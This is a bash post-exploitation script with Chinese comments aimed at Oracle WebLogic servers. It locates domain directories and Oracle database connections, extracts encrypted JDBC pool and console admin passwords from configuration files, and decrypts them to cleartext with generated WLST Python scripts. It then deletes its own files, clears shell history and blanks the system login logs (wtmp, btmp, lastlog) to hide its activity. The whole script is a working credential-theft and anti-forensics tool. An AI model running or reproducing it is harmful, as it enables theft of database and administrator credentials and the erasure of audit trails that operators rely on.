echo "查找数据库连接"
netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u

# doman
sdomain=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|sort -u|sed 's/_domain.*$/_domain/g'`
# 精准找到wlst.*， 用于破解jdbc连接池密码
wlst=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "wlst.*"|sort -u`
echo "domain dir: ${sdomain}"

# 获得连接池配置密码加密串
echo "连接池信息"
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"

enPswd=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
echo "jdbc pool pswd: ${enPswd}"
# 获取破解后的密码
tmpFl=`mktemp`
cat <<EOT>${tmpFl}
import os
import weblogic.security.internal.SerializedSystemIni
import weblogic.security.internal.encryption.ClearOrEncryptedService
def decrypt(domainHomeName, encryptedPwd):
    domainHomeAbsolutePath = os.path.abspath(domainHomeName)
    encryptionService = weblogic.security.internal.SerializedSystemIni.getEncryptionService(domainHomeAbsolutePath)
    ces = weblogic.security.internal.encryption.ClearOrEncryptedService(encryptionService)
    clear = ces.decrypt(encryptedPwd)
    print "jdbc pool passwd:" + clear

try:
    if len(sys.argv) == 3:
        a = sys.argv[2].split()
        for i in range(1, len(a)):
            decrypt(sys.argv[1], a[i])
    else:
        print "INVALID ARGUMENTS"
except:
    print "Unexpected error: ", sys.exc_info()[0]
    dumpStack()
    raise
EOT
echo "jdbc连接池密码..."
${wlst}  ${tmpFl}  ${sdomain} ${enPswd}
# 搜索weblogic console admin用户名及密码
export DOMAIN_HOME=${sdomain}
cd $DOMAIN_HOME/security
echo "所有weblogic console 用户名及密码"
find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
cat <<EOT>./xxx.py
import os
from weblogic.security.internal import *
from weblogic.security.internal.encryption import *
encryptionService = SerializedSystemIni.getEncryptionService(".")
clearOrEncryptService = ClearOrEncryptedService(encryptionService)
for i in range(1, len(sys.argv)):
   pwd = sys.argv[i]
   # Delete unnecessary escape characters
   preppwd = pwd.replace("\\\\", "")
   print "Decrypted string is: " + clearOrEncryptService.decrypt(preppwd)

EOT
echo "开始破解weblogic console 用户名及密码"
find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
rm -rf $DOMAIN_HOME/security/xxx.py

# 获取jdbc配置信息
echo "all jdbc.properties:"
ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|xargs -I {} find {} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"
# echo "输出所有jdbc连接池配置信息"
# ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "*jdbc*.xml"|sort -u|xargs -I {} cat {}

rm /tmp/myX.sh
rm ${tmpFl}
unset HISTFILE
history -c
history -cw
echo > ~/.bash_history
cat /dev/null > ~/.bash_history
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
>~/.bash_history
>/var/log/lastlog
>/var/log/wtmp
>/var/log/btmp

